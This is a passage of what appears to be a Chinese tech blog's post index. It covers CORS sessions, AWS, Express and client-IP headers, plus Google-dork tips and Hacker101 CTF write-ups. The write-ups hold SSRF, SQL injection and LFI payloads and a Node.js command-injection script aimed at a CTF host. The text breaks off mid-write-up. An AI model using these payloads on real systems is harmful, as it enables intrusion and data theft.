{"pages":[{"title":"Archives","text":"","link":"/archive/index.html"},{"title":"All Tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"前後端分離下之使用 session","text":"這邊主要在介紹當前後端架構上完全分離 (連 domain 都分離) 狀況下要如何達到使用 session 的方法 知道 CORS 是什麼的人且想直接知道怎麼做可以直接跳到重點筆記 前言以往我們前後端程式是寫在一起時，都是透過後端程式去 render (渲染) 一個頁面而在前端頁面做請求的時候，請求都會帶著 cookie 到 server 上去判別是否屬於為同一個人但當我們在前後端完全分離的狀況下，該怎麼去達到這件事情呢? CORS瀏覽器有一個限制，當這個 request 請求起始的地方跟 endpoint 不一致得時候會造成所謂 CORS 的問題舉例來說，假設網站架設在 https://www.example.com 底下，但是你的 API Server 是在 https://www.example1.com 的話這樣網站 POST 到 API Server 的請求就會被阻擋 (這時 request 是從 html 頁面發起) 因為這個限制，API Server 往往要在 Header 上加上以下幾個東西去符合瀏覽器的規範 Access-Control-Allow-Headers Access-Control-Allow-Origin Access-Control-Allow-Methods 透過設置這三個 header 的參數，就可以讓前端合法的使用 API Server 了所以按照剛剛的邏輯去加上 Header 會這樣加Access-Control-Allow-Headers: *Access-Control-Allow-Origin: https://www.example.comAccess-Control-Allow-Methods: POST 然而在使用前後端分離的架構下，身份驗證以及授權就相對上就變得比較難一點雖然解法上還可以使用 JWT 去解決這個問題，但這篇文章主要會鎖定在用 sessino 的方式去解決 題外話，有一種方式也可以繞過 CORS，就是以 Proxy Server 的方式去實作以下用著名的 Vue cli 為圖解 XHR Credential當加上以上三個 CORS 的規範後會發現在發出 request 的時候，是不會帶入 cookie 去給 server 做驗證 這時候就可以透過 xhr 裡面的 credential 去設定當把這個欄位設定成 true 的時候，request 就會夾帶 cookie 到 server 去 詳細操作說明提到前後端完全分離的話，那我們就要準備兩個 server一台 server 專門是讀取靜態 html 的 server一台 server 專門是處理 API 的 server html server透過 Node.js 快速建立一個可以讀取靜態檔案的 server 1234const express = require('express');const app = express();app.use(express.static(\"./public\"));app.listen(8888); 而 public/index.html 的內容為 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; let ajax = new XMLHttpRequest(); ajax.open('POST', 'http://localhost:7777/test'); ajax.setRequestHeader('Content-Type', 'application/json'); ajax.onload = function() { if (ajax.status === 200) { alert('Received ' + ajax.responseText); } }; ajax.send(JSON.stringify({ data: \"hi from html\" })); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; api server另一台主要當作 api server主要就印出 session id 來觀看每一次的 request 是不是同一個人 const express = require('express'); const app = express(); const session = require('express-session') var sess = { secret: 'keyboard cat', cookie: {}, resave: true, saveUninitialized: false, } const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.use(bodyParser.urlencoded({ extended: true })); app.use(session(sess)) app.use((req, res, next) =&gt; { res.setHeader(\"Access-Control-Allow-Headers\", \"X-Requested-With, Accept, Content-Type, Cookie\") res.setHeader(\"Access-Control-Allow-Origin\", \"*\") res.setHeader(\"Access-Control-Allow-Methods\", \"GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS, PATCH\") next(); }) app.post('/test', (req, res) =&gt; { console.log(req.sessionID); req.session.a = \"hi\" res.json({a: 1}) }) app.listen(7777, () =&gt; { console.log('start'); }); 實作透過執行以上的兩個 server 程式，寫後近到 http://localhost:8080 之後按下幾次重整，可以看到 api server 印出來的 session 每一次都是不同個 接下來就是要透過 xhr 的 credential 去設定在 ajax 送出之前要加上 ajax.withCredentials = true; 這樣才可以把 Cookie 夾帶上去但會發現瀏覽器卻爆出另一個錯誤訊息The value of the 'Access-Control-Allow-Credentials' header in the response is '' which must be 'true' when the request's credentials mode is 'include'這是前後端必須要同步都使用 credentials 才可以用於是在後端 server 加上 Access-Control-Allow-Credentials: true 但再度重整之後又發現新的錯誤！The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. 其實這也是限制的一種，當使用到 credentials 的時候，後端必須多限制只有一個 domain 能使用 Access-Control-Allow-Origin: http://localhost:8888這樣設定之後按幾次重整就會發現 session id 是一致的了 重點筆記後端必須加上以下的 headers Access-Control-Allow-Headers: * Access-Control-Allow-Origin: http://localhost:8888 只能指定一個 domain，不能用 * 字號 Access-Control-Allow-Methods: * Access-Control-Allow-Credentials: true 1, 3 兩點根據需要使用的 method 和 headers 再去客製化以資安來說建議不寫上 *，寫上有使用的就可以了 前端則是必須在 xhr 上面加上 xhr.withCredentials = true 後記以上為簡單介紹如何在前後分離架構下依舊可以使用 session 的方式而文章有提到 JWT，那是另一種驗證及授權方式，有機會再來談談這個技術實作的方式","link":"/2019/06/02/ajax-with-session/"},{"title":"AWS Certificate Manager 如何更換憑證 (Reimport Certificate)","text":"前言AWS 有提供一套服務可以把申請好的憑證一次給多個服務使用掛載在上面的憑證可以給 load balanacer, cloudfront 等等使用 以 load balancer 來說外面 https:443 進來後，要導入到 http:8080 的服務就會需要把憑證解開，然後進一步把流量往裡面送所以在 load balancer 上面就一定要掛載 private/public key 才有辦法去解開進來的流量像是在選 load balancer 的頁面，選擇 port forwarding 的時候就會需要選擇要掛載哪一個 certificate 而在 cloudfront 的時候在申請的同時也會需要填入要用哪一組憑證 (Customer Certificate) 當選入憑證的時候，Cloudfront 配給你的 domain 是 xxxxx.cloudfront.net 這種但憑證假設安裝的事 api.example.com 這種，會導致不安全的提示出現此時會需要到網域註冊商，把 CNAME api 指到 xxxxx.cloudfront.net到時候瀏覽 api.exmaple.com 就會出現合法的憑證了 如何更新憑證首先要進入到 AWS 的 Certificate Manager 頁面，並且點選你想要 Reimport 的憑證右上角會有一個藍色的『Reimport Certificate』按鈕，點選下去會到一個輸入頁面 到了輸入頁面會看到有 Certificate Body, Certificate Private Key, Certificate Chain接下來就把跟網域註冊商申請到的憑證一個一個貼上去即可，注意這裡要是 PEM 格式 其實在新增憑證的時候，也是一模一樣的流程","link":"/2020/01/06/aws-certificate-manager/"},{"title":"使用 Apple Pay 時 Safari 如何開啟開發者模式去 Debug 呢?","text":"有時候在使用類似 Apple Pay 的東西並不知道該如何去看手機中 Safari 的偵錯\b然後就會愣在那裡，並不知道該怎麼 Debug今天要跟各位來介紹如何在 iPhone 上面開啟 Safari 的開發者模式 前提首先要確認 iPhone 手機上面的 Safari &gt; 進階 &gt; 網頁檢閱器 是否有打開才可以喔！沒有打開的話是不能使用 Develop Debug mode 整體流程 把你的 iPhone 線接到 Mac 上 在手機上面開起 Safari，然後打開一個頁面 開啟 Mac 上的 Safari 左上選單選擇 『開發者』(Develop) 下面會有你手機的名稱，點下去就會看到手機 Safari 頁面 接下來會跳出 Safari 的開發者模式，就可以繼續 Debug 拉 ~","link":"/2018/04/21/apple-debug/"},{"title":"AWS CloudWatch Logs Insights 介紹及教學","text":"前言AWS CloudWatch 是一個可以監控日誌用以及伺服器狀態等等的服務其他還有像是 Alarm Events 都是從以下兩個大項目延伸出去的額外功能這邊就先不多作介紹，之後會寫在其他篇幅做介紹那 CloudWatch 主要包含以下兩個大項目 Metric 紀錄了 AWS 上面服務的狀態 包含 EC2 的 CPU、網路使用量、記憶體用量和硬碟大小 API Gateway API Call Count、RDS CPU 用量等等 針對用量還可以去做 Alarm 發信，或是觸發 Lambda 等等的功能 記憶體和硬碟大小需要額外設定可以參考 https://docs.aws.amazon.com/zh_tw/AWSEC2/latest/UserGuide/mon-scripts.html Log 存放 Log 的地方，伺服器的 access log 或是程式的 log 又或是 audit log 等等，基本上想看的 log 可以推上來做分析以及整理 除此之外，s3 其實也是一個放 log 的好地方 但 s3 的缺點是不能夠很便利的去線上觀看 log 今天主要介紹的是 CloudWatch Logs Insights 功能透過 Insights 可以有效地查詢 Log 裡面的資料甚至還可以做統計以及剖析 Log 裡面的字串進行字串統計 使用方式範例一 - like123fields @timestamp, @message| sort @timestamp desc| filter @message like &quot;Your Wanted Message&quot; 第一行 fileds 主要指定最後出現的欄位會有什麼第二行 sort 是根據 timestamp 進行由大至小的排序第三行 filter 是針對 @message 的內容去搜尋 最後只會顯示跟 like 後面有關的字串的結果而已 這邊要另外注意的事情是，每一個指令都是有順序性的以上面第三行的結果來說假設第四行再下了一個 filter @message like &quot;blablabla一個跟前面完全沒有關係的訊息是找不到的因為在第三行就把所有訊息都過慮剩下只有 “Your Wanted Message”所以在第四行針對 “Your Wanted Message” 去搜尋 “blablabla” 當然就不會出現任何結果 範例二 - @logStream在整個操作 UI 上最上面會有一個可以選 logGroup 的地方但卻沒有選 logStream 的地方 此時會需要透過 filter 加上 @logStream 的方式才能找單獨的 stream12fields @timestamp, @message| filter @logStream = &quot;Access Logs&quot; 範例三 - parse假設今天要處理 access log 的 path 做統計的話字串有一段內容是 “GET /login HTTP/1.1”我想要 parse 出 /login 的話該怎麼做呢？123fields @timestamp, @message| sort @timestamp desc| parse '&quot;GET * HTTP/1.1' as @path第三行 透過 parse 指令加上 * 可以把 * 的地方變成一個變數指定到 as 後面的變數去這裡變數要不要加 @ 都可以，結果如下： 那如果想要 parse 兩個變成變數呢?很簡單，就是再多加一個 * 字號在後面即可| parse '&quot;GET * */1.1' as @path, @protocol 範例四 - stats count()以前面的例子來說我想知道在短時間內有幾個 login 的話可以透過 stats 的指令去做統計12345fields @timestamp, @message| filter @logStream = &quot;Access Logs&quot;| sort @timestamp desc| parse '&quot;GET * */1.1' as @path, @protocol| stats count(*) as sum by @path第五行 透過 by 指令去 group by 用哪一個參數當作目標去做計算 當然一樣可以多個 | stats count(*) as sum by @path, @protocol 後記以上介紹一些個人比較常用的指令，官網還有很多非常好用的指令詳細有興趣可以到官網上查查看https://docs.aws.amazon.com/zh_tw/AmazonCloudWatch/latest/logs/CWL_QuerySyntax.html","link":"/2019/11/28/aws-cloudwatch-logs-insights/"},{"title":"如何從多層 Load Balancer / Nginx 取得使用者正確的 IP?","text":"前言我們有時候要取得使用者 IP往往都會用最簡單的方式取得 IP以 express 為例子，會使用 req.connection.remoteAddress req.ip 等等方式取得 IP但你知道，當伺服器被多層的 Load Balancer 保護在前面的時候取得到的 IP 會是 Load Balancer 的嗎?而真正的 IP 會被 Load Balancer 放在 X-Forwarded-For 上面，傳遞到後面伺服器如果不知道的話，那這邊文章有可能會幫助到你 接下來會以 AWS 的 Load Balancer 以及伺服器上建立一個 Nginx 服務然後還有一個 express server 服務來說明從無 Load Balancer 到雙層 Load Balancer 的架構下分別該如何取得 IP Direct Connection架構示意圖如下 當我們連線時直接連到伺服器時可以透過 express 的 req.connection.remoteAddress 取得到使用者的 IP (233.x.x.x)原因是此時的呼叫者是使用者 單層 Load Balancer架構示意圖如下 當我們遇到只有一層 Load Balancer 時透過 express 的 req.connection.remoteAddress 會取得到的是 Load Balancer 的 IP (10.x.x.x, 圖中最下面)原因是 Load Balancer 作為中介者，取得到了 Rqeuest 之後會再往後端伺服器轉發，這時候呼叫者就是 Load Balancer 而不會是使用者使用者真正的 IP 是會放在 header 的 X-Forwarded-For 上面 (233.x.x.x) 這邊 Load Balancer 可以是 Nginx，但這邊我們用 AWS Load Balancer 做 DEMO原因是我們後面會需要架構出兩層 Load Balancer 的狀況 雙層 Load Balancer架構示意圖如下 而當我們再加上一層 Load Balancer 的時候 (這裡用 nginx 代替)透過 express 的 req.connection.remoteAddress 會取得到的是 Nginx 的 IP因為呼叫者從上一個案例的 Load Balancer 變成了 Nginx而我們這邊 Nginx 是架設在 localhost 裡面，所以可以看到 IP 是 127.0.0.1 (圖中最下面)那前面 Load balancer 的 IP 就被放到 X-Forwarded-For 上面去了 (10.x.x.x 那個) 雙層 Load Balancer + 惡意 X-Forwarded-For架構示意圖如下 狀況如同前面的 Case，但這邊唯一不一樣的是萬一使用者自己在 X-Forwarded-For 加了 X-Forwarded-For: 5.5.5.5, 6.6.6.6這些資料是會被放到 X-Forwarded-For 最前面去的所以在取得 IP 的時候要特別注意並不是取得 X-Forwarded-For 的第一個就可以了應該要根據你前面放了多少個 Load Balancer 去決定要拿從後面數過來的第幾個才是正確的 References其他還有很多詳細的介紹，非常推薦看以下這篇文章，大推！ https://devco.re/blog/2014/06/19/client-ip-detection/","link":"/2020/01/09/express-get-client-ip-from-load-balancer/"},{"title":"CloudFront 設定 Header Forward","text":"最近在使用 CloudFront Header forward 的設定CloudFront 預設會把 User-Agent 這個 header 替換成 Amazon CloudFront於是開始研究起要怎麼把原始的 User Agent 完整的帶到 Origin 去 但由於 CF 上面的設定寫的不是很清楚於是發現以下這篇 AWS 官方文章這裡直接做一個總結 None: 使用 CloudFront 原生的行為 (例如替換 User-Agent) Whitelists: 把 whitelists 裡面的參數，完整不動 的 Forward 到 Orign 去使用 ALL: 把所有參數都 forward 到 Origin 去 下面是一個 whitelist 的簡單範例 以這張圖的設定的來說，代表 User-Agent 不會被 CloudFront 給自動替換掉而是會拿原生User-Agent直接 forward 到 Origin 去 另外這邊要提醒，Cloudfront 預設是不會 Forward Headers, Cookies 和 Query String 的這邊要特別注意，要特別設定才可以那至於 Cookie 以及 Query String 的設定看上面就明瞭了","link":"/2018/09/05/cloudfont-setting/"},{"title":"How to use mapping template with API Gateway in AWS","text":"[Update] 2017-11-08 原本文章的 mapping 方式再依些特別狀況會出錯，在文章最下面加入了最新的 mapping 方式 最近需要在 API Gateway 上面作 request 和 response 的參數調整這裡紀錄一下一些基本的使用語法官方網站也有提供使用方式還有一些例子或是可以直接到 Apache Velocity Template Language if else1234567{ #if ($variable == &quot;cool&quot;) &quot;variable&quot; : &quot;$variable&quot; #else if ($variable == &quot;hot&quot;) &quot;variable&quot; : &quot;$variable&quot; #end} 如果參數是 cool 的話，顯示出來是123{ \"variable\": \"cool\"} type以上一個 case 來說，把 variable 改成是 1123{ &quot;variable&quot;: &quot;$variable&quot;} 這樣顯示出來會是123{ \"variable\": \"1\"} 但是如果改成這種格式123{ &quot;variable&quot;: $variable}這樣顯示出來會是123{ \"variable\": 1} 這邊要注意的是，如果格式是以下這樣，然後參數是 “test”123{ &quot;variable&quot;: $variable}這樣顯示出來會是1234{ // 這會直接讓 API Gateway mapping template 直接爆炸 \"variable\": test} key如果把 $variable 設成 “test”，並用以下的 template123{ &quot;$variable&quot;: &quot;$variable&quot;}結果會是123{ \"test\": \"test\"} foreach and keySet資料如下123456789101112{ \"data\": { \"book\": [{ \"title\": \"cool\", \"serial\": 123 }, { \"title\": \"hot\", \"serial\": 321 }] }, \"comment\": \"Hi\"} 我想要把他轉換成以下的格式，該怎麼用 mapping template12345678910{ \"book_library\": [{ \"name\": \"cool\", \"number\": 123 }, { \"name\": \"hot\", \"number\": 321 }], \"message\": \"Hi\"} mapping template 可以這樣寫12345678910111213141516171819202122232425262728293031323334353637#set($root = $input.path(\"$\")){ // keySet 可以拿到這層所有的 key // 這裡可以拿到 data 和 comment ($rootKey) #foreach($rootKey in $root.keySet()) #if($rootKey == \"data\") \"book_library\": [ #foreach($elem in $root.get($rootKey)) { // 這層可以達到 title 和 serial #foreach($i in $elem.keySet()) #if($i == \"title\") \"name\": \"$elem.get($i)\" #elseif($i == \"serial\") // 因為要讓這裡是數字，所以不加上雙引號 \"number\": $elem.get($i) #end #if($foreach.hasNext),#end #end } #if($foreach.hasNext),#end #end ] #elseif ($rootKey == \"comment\") \"message\": \"$root.get($rootKey)\" #end // 這是為了讓 // { // \"test\": 123 // } // 最後面的 123 加逗點用的 // 如果是會後一個，就不會加逗點了 #if($foreach.hasNext),#end #end} 更好的寫法在 aws 官網中，除了拿到 raw payload 之外還可以利用 $input.json() 的寫法拿到格式更完整的資料因為在原本的方式中，如果拿到的字串包含 \\n，這會讓 API Gateway 爆炸雖然可以透過 $util.escapeJavaScript 的方式避免但在每一個地方都加上 $util.escapeJavaScript 也是很蠢所以新的寫法會像是這樣 第一個地方是 #set($count = $foreach.count - 1) 這是為了拿到 index 第二個地方寫法就比較特別，拿到 index 之後，$input.json($) 這樣是拿到整個 payload (JSON)如果 $rootKey = 'book_library' 那這樣寫$input.json(&quot;$['$rootKey']&quot;) 等於 $input.json(&quot;$['book_library']&quot;) 的寫法，就可以拿到陣列了。那如果要拿第一個的話$input.json(&quot;$['$rootKey'][0]&quot;) 這樣就能拿到, 如果用變數取代的話，可以寫成$input.json(&quot;$['$rootKey'][$count]&quot;)拿到陣列後，要拿陣列裡面的物件就可以這樣寫$input.json(&quot;$['$rootKey'][0]['$i']&quot;) 等同於 $input.json(&quot;$['$rootKey'][0]['title']&quot;) 第三個就是讓剩餘的都直接拿出來就結束了 要特別注意的點是，不用加上 “” 在 $input.json() 外面了因為用 $input.json() 拿的已經是完整格式了String 就是 String，不用像上面的方式還要加上 “” 去讓他變成字串Boolean Int 等等全部都是，也不用擔心 \\n 這個出現1234567891011121314151617181920212223242526272829303132333435363738394041424344#set($root = $input.path(\"$\")){ // keySet 可以拿到這層所有的 key // 這裡可以拿到 data 和 comment ($rootKey) #foreach($rootKey in $root.keySet()) #if($rootKey == \"data\") \"book_library\": [ #foreach($elem in $root.get($rootKey)) { // ============= Here ================= #set($count = $foreach.count - 1) // ============= Here ================= // 這層可以達到 title 和 serial #foreach($i in $elem.keySet()) // ============= Here ================= #if($i == \"title\") \"name\": $input.json(\"$['$rootkey'][$count]['$i']\") #elseif($i == \"serial\") \"number\": $input.json(\"$['$rootkey'][$count]['$i']\") #end // ============= Here ================= #if($foreach.hasNext),#end #end } #if($foreach.hasNext),#end #end ] #elseif ($rootKey == \"comment\") // =============== Here ============== \"message\": $input.json(\"$.$rootkey\") // =============== Here ============== #end // 這是為了讓 // { // \"test\": 123 // } // 最後面的 123 加逗點用的 // 如果是會後一個，就不會加逗點了 #if($foreach.hasNext),#end #end}","link":"/2017/10/24/api-gateway-mapping-template/"},{"title":"Express 對靜態檔案做了什麼? 為什麼會被 cache 住呢?","text":"前言最近突然有一個想法開始研究起瀏覽器端的 Cache 方法加上小弟常用 nodejs + express 去寫前後端於是開始研究起 express 裡面有一個 middleware 怎麼做起瀏覽器 cache 這件事 介紹在 express 裡面有一個 function 叫做 express.static()這個是一個 middleware，最常被用在要讀取一些靜態檔案上面以這個寫法來說 app.use(express.static(__dirname + './public'))是指向 public 這個資校夾裡面，假設裡面有一個檔案叫做 index.html 的話，並且伺服器的 port 是 8080那麼在網址列輸入 http://localhost:8080/index.html 這樣就可以讀到這個檔案了 追朔源頭那我的疑問來了，我打開 Chrome Inspect 的 Network Tab 去看了一下他的 Response Headers發現一件很奇怪的事情，我明明什麼都沒有設定，卻出現幾個有關 Cache 的 Headers Accept-Ranges Cache-Control ETag Last-Modified 有關 Cache 的一些機制和理論就不多作介紹這裡單純就爬一下 Source Code，看看 express 對靜態檔案做了什麼 express在 express source code 中，發現他是用了另一個 library server-static於在就再來看看 server-static 做了什麼 1exports.static = require('serve-static'); serve-static我只列出關鍵幾行，其他行主要都是設置參數用而已 從第一行可以看出，把 serverStatic 這個 function 給 export 出來了再往下看會發現有一個 send function 把 path 傳了進去然後在最後面，stream.pipe(res) 對 response 做了一些更動 於是再往下找找看 send() 這個是什麼東西 12345678910111213module.exports = serveStatic;var send = require('send')function serveStatic (root, options) { // Some codes .... var stream = send(req, path, opts) // Some codes .... // pipe stream.pipe(res)} send – send根據上一段程式最後一段 (12行)，他 call 了一個 pipe 的 functionpipe function 裡面去 call this.sendFile(path)this.sendFile 裡面又去 call self.send(path, stat)然後在 send 這個 fucntion 裡面出現關鍵的 function – this.setHeader看來 response headers 就是在這邊被更改了 123456789101112131415161718192021222324252627module.exports = send// 這邊回傳給到 server-static 去 call// 也就是上一段程式碼的第 8 行，然後在第 function send (req, path, options) { return new SendStream(req, path, options)}SendStream.prototype.pipe = function pipe (res) { this.sendFile(path)}SendStream.prototype.sendFile = function sendFile (path) {// 這個等等 demo 截圖會看到，所以先留著 debug('stat \"%s\"', path) self.send(path, stat)}SendStream.prototype.send = function send (path, stat) { // 這個等等 demo 截圖會看到，所以先留著 debug('pipe \"%s\"', path) // set header fields this.setHeader(path, stat)} send – setHeader找到了對 header 做更動的地方後，以第 11 ~ 20 行中間這段 Code 來說去設置了 Cache-Control 的內容，依照整個邏輯下如果沒有特別設置，那麼 header 會長以下這樣 Cache-Control: public, max-age=0 123456789101112131415161718192021222324252627282930313233SendStream.prototype.setHeader = function setHeader (path, stat) { var res = this.res this.emit('headers', res, path, stat) if (this._acceptRanges &amp;&amp; !res.getHeader('Accept-Ranges')) { debug('accept ranges') res.setHeader('Accept-Ranges', 'bytes') } if (this._cacheControl &amp;&amp; !res.getHeader('Cache-Control')) { var cacheControl = 'public, max-age=' + Math.floor(this._maxage / 1000) if (this._immutable) { cacheControl += ', immutable' } debug('cache-control %s', cacheControl) res.setHeader('Cache-Control', cacheControl) } if (this._lastModified &amp;&amp; !res.getHeader('Last-Modified')) { var modified = stat.mtime.toUTCString() debug('modified %s', modified) res.setHeader('Last-Modified', modified) } if (this._etag &amp;&amp; !res.getHeader('ETag')) { var val = etag(stat) debug('etag %s', val) res.setHeader('ETag', val) }} DEMO另外提供另個方法可以追回去 (我是懶得寫程式直接看 source code XD)安裝完環境之後要跑 server 的時候，可以這樣下 DEBUG=* node server.js 從圖片中可以發現，那些 log message 是一樣的 後記一直以來以為是 express 的做法讓檔案可以 cache 住原來一直都是默默無名的 opensouce library 在幫助 express 啊希望這篇有稍微幫助到對 express 處理 static files 有疑慮的人","link":"/2017/12/11/express-static/"},{"title":"Google Hacking","text":"這次要跟大家介紹一下 Google 到底有多好用相信用過 Google 都知道，Google 的搜尋很方便但是你知道，Google 還有提供除了關鍵字搜尋以外的各種神奇的搜尋方式嗎 ? 下面這張表就是 Google 提供的各種搜尋技巧先用幾個來讓大家了解如何使用這個方便的技巧吧！ site:假設我想要搜尋我這個網站的，光靠關鍵字搜尋是很難搜尋到的排名不高，曝光度也不高更是難上加難但是可以透過以下的方式搜尋到1site:yu-jack.github.io intitle:intitle 就是搜尋 title 呈現的文字我們可以搜尋一個有趣的東西 “Index Of” 1intitle:&quot;Index Of&quot; 可以發現搜尋到一些看起來很像目錄的東西這個代表這個網站的開發者，沒有適當的處理這個問題這樣會導致網站的所有目錄曝光在公眾之下裡面是什麼，我就不點了，有興趣可以試試看 inurl:inurl 就是搜尋 url 之中有沒有包含這個字串我用以下方式搜尋的話1inurl:login就會發現一堆 url 包含 login 的網址出現 filetypefiletype 會去搜尋副檔名，但是他不能單獨使用必須跟其他指令混在一起使用 1inurl:ntust filetype:pdf 結論這邊做了一點簡單的介紹而已，並沒有作太多詳細介紹但是可以參考以下的 PDF 去觀看更多不同的技巧Google Hacking for PenetrationTesters 下面這個是公開搜尋 keyword，也許可以直接搜尋到別人不想讓你看到的東西Google Hacking Database 介紹就到這邊，以後有空會再回來把這篇補詳細","link":"/2017/10/17/google-hacking/"},{"title":"如何增加 EC2 硬碟大小 (Expand the disk space in EC2)","text":"前言在使用 AWS 服務時，有時候會因為 log 量太大導致硬碟大小不夠此時會需要把硬碟增加大小，以免整台機器爆掉接下來會針對如何增加硬碟大小做說明 確認硬碟大小方法可以透過 df -h . 指令確認硬碟目前使用的大小這時候可以看到硬碟配置的大小 接下來可以透過 lsblk 回找最大上限的配置可以是多少上面 xvda 就是最多可以有多少大小下面 xvda1 就是實際上目前有多少大小 看另一個例子，以下圖的 xvdi 和 xvdi1 來說可配置最大上限為 8G，但目前正在使用的最大上限為 1023 MB 增加硬碟大小到 EC2 的頁面點選要更新的 EC2，點選右下角 disk 點進去之後，就進入到另一個頁面，點選 Action &gt; Modify，會看到以下頁面，就可以增加大小了 接下來要到 EC2 裡面把實際上使用的大小擴充到可配置的最大空間以剛剛的 xvdi 為例的話，需要執行以下兩個指令才可以擴充12sudo growpart /dev/xvdi 1sudo resize2fs /dev/xvdi1這樣大小會直接擴充至可配置的最大上限，如果不想要配置到最大的話可以在後面加上幾 G 去做限制，如下123# 擇一sudo resize2fs /dev/xvdi1 2Gsudo resize2fs /dev/xvdi1 2048M","link":"/2020/01/06/aws-increase-disk-space-in-ec2/"},{"title":"Hacker 101 CTF Write Up Part 3 - Ticketastic Live Instance","text":"系列篇第三篇，目前題目寫下來都蠻有趣的 Ticketastic: Live Instance根據題目總共有 2 個 Flag 0x00一進來發現有兩個同樣名稱的題目，這邊先點上面的 DEMO 進去看看 大概就是介紹，但最後發現一句特別的話『會有機器人來讀這些 ticket』不太明白這意思，先放著一邊繼續看看有什麼功能，裡面提到用 admin/admin 可以先登入 登入後可以看到有一個 ticket 以及可以新建使用者 點了 ticket 進去看了一下，提到說，如果處理錯誤的話會在這邊被標記起來看起來是使用者提供錯誤的連結的話，當機器人處理不了時會在這邊顯示提醒但這邊看起來沒什麼洞可以挖，繼續往下 嘗試去建立使用者，發現可以建立成功 另外還發現建立方式是用 GET 去建立這就有點微妙了，一般來說，像是使用 LINE 等等通訊軟體貼連結上去，都會預設去做 GET，然後把預覽顯示出來這邊也有可能走這種方式 這邊建立一個 ticket 嘗試看能不能用 GET 連結的方式去建立使用者但卻發現連結處理錯誤!? 試著換另一個連結，依舊錯誤 想了非常久才想到，這應該是 SSRF 的一種利用於是把 payload 改成 localhost 的方式去探測能不能用內網方式新增使用者發現不再顯示錯誤連結！ 建立的使用者也能正確地登入！ 接著就把這個 Payload 帶到另一個題目，發現能夠登入！登入後發現第一個 FLAG 0x01接下來發現連結上面有 id試著帶入單引號發現噴出 SQL Exception 丟入 sqlmap dump 出 admin 的密碼就是 FLAG 了","link":"/2019/09/08/hacker101-part3/"},{"title":"Hacker 101 CTF Write Up Part 4 - Photo Gallery","text":"Photo Gallery 0x00一開始畫面長這樣 發現原始碼有一個 fetch?id=1 點進去網址發現回傳一個 jpg 的 text 檔案 從這可以推測他是用 id 去 mysql 取出 filename 然後讀出來的加個 ‘ 發現好像沒有 SQL Injection 的存在，但卻出現 500 Internal Server Error可能程式有哪邊出錯了，繼續往下測試 不過當改下 fetch?id=1 union all select 1 以及 fetch?id=1 union all select 1,2 發生一點不同變化前者出現跟 fetch?id=1 結果一模一樣 (上圖)後者卻出現 500 Internal Server Error (下圖) 看來就是有 SQL Injection 的問題了接下來找到可以用 fetch?id=1 and length(database()) = 6 這種方式去判斷後者是否為 true思路大概跟這篇做法一樣 https://www.hackthis.co.uk/articles/blind-sql-injection用各種 length() 以及 like '______' 的方式可以找到相對應的值這邊就直接丟 sqlmap 把整個 table dump 出來了就發現 FLAG 了 0x01這提跟前一提的 fetch?id=1 union all select 1 Payload 有關係前面有提到是透過 id 去撈 filename 回來去顯示改成 fetch?id=123123 union all select &quot;files/adorable.jpg&quot; 發現可以正確觸發 LFI 漏洞就出現了，我可以任意去讀檔案了本來想說這 php 寫的網站用以下的 payload，結果取得不到 …fetch?id=123123 union all select &quot;index.php&quot; 後來看提示才知道這是用 uwsgi-nginx-flask-docker image 做的此 image 原始碼在放在 main.py，所以改成以下 payload 就讀到原始碼，發現第二個 FLAGfetch?id=123123 union all select &quot;main.py&quot; 0x02看到 source code 之後，發現在取得 used space 那邊有 command injection 的問題subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\\n', 1)[-1]只要能在 filename 加上 ; 再加上後面想要執行的指令就可以觸發 CI 的問題了但要觸發他必須要靠 photos table 裡面的 filename 去觸發一開始嘗試使用 stacked query 的方式，以下為 payload541; UPDATE photos SET filename = '; ls ' WHERE id = 3; 試了很久完全沒有任何反應，本來以為不是 stacked query 這條路結果回去翻題目的提示有提到 COMMIT 這個關鍵字才想到有時候 SQL 指令下 UPDATE 變更完並不會馬上生效而是要下 COMMIT; UPDATE 的語法才會真正觸發於是 Payload 改成以下這樣就成功了，下面變成 uwsgi.ini 了fetch?id=541; UPDATE photos SET filename = &quot;; ls&quot; WHERE id = 3; COMMIT; 然後根據 main.py 的 regex 修改一下，然後寫出一個可以一直輸入 command 的 node.js 程式123456789101112131415161718192021222324252627function inputFunction(readline) { readline.question(`Keep input\\n\\n`, async (command) =&gt; { const axios = require('axios') await axios({ method: 'GET', url: 'http://34.74.105.127/8142a5acbe/fetch', params: { id: `541; UPDATE photos SET filename = '; ${command} | tr \"\\\\n\" \";\" ' WHERE id = 3; COMMIT;` } }).then(response =&gt; response.data).catch((err) =&gt; { return; }) let result = await axios({ method: 'GET', url: 'http://34.74.105.127/8142a5acbe/' }).then(response =&gt; response.data) console.log('\\n' + result.split('Space used: ')[1].split('&lt;/i&gt;&lt;/div&gt;')[0].replace(/;/g, \"\\n\")); inputFunction(readline) })}(() =&gt; { const readline = require('readline').createInterface({ input: process.stdin, output: process.stdout }) inputFunction(readline)})() 但是逛了老半天 … 完全不知道 flag 放在哪裡跑回去看題目提示到 『enviroment』，才想到有可能放在應用程式裡面的環境最後下一個 printenv 就拿到 FLAG 了 ！ 簡單 demo 影片 後記這題蠻有趣的，學到 stacked query、command injection 以及 LFI不過過程中有些真的不知道怎麼做，跑去看提示才知道不然真的瞎子摸象摸不太出來 QQ","link":"/2019/09/10/hacker101-part4/"},{"title":"Hacker 101 CTF Write Up Part 2 - Micro-CMS v1, Petshop Pro","text":"系列篇第二篇，Micro-CMS v1 還因為玩壞掉我重開了快二十次才可以開來玩 QQ Micro-CMS v1根據題目總共有 4 個 Flag 0x00打開頁面後頁面是 試著建立 post 試試看 發現有 XSS 跳出來，但打開原始碼沒發現什麼變化 按了 Go Home 會去上一頁就跳出 FLAG 了 0x01因為跳出 xss 的時候注意到 page 後面的 id 帶的是 8覺得很疑惑，因為總共才三筆資料，id 怎麼會是 